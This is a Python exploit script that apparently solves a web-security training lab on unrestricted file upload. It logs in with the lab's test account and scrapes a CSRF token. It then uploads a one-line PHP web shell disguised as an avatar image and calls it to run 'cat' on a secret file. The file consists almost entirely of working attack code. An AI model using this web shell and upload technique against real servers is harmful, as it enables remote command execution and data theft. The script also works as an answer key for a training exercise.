import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

# step 1: log in as wiener
lab.login("wiener", "peter")

# step 2: grab csrf token from the account page
page = lab.get("/my-account")
soup = BeautifulSoup(page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

# step 3: upload a php web shell as the avatar
# server has no file type validation so .php gets accepted and executed
shell = b'<?php system($_GET["cmd"]); ?>'
lab.info("Uploading web shell...")
resp = lab.post("/my-account/avatar", files={
    "avatar": ("shell.php", shell, "application/x-php")
}, data={
    "user": "wiener",
    "csrf": csrf
})
lab.info(f"Upload status: {resp.status_code}")

# step 4: hit the shell to read the secret file
secret_resp = lab.get("/files/avatars/shell.php?cmd=cat+/home/carlos/secret")
secret = secret_resp.text.strip()
lab.success(f"Secret: {secret}")

# step 5: submit and verify
lab.post("/submitSolution", data={"answer": secret})
lab.check_solved()
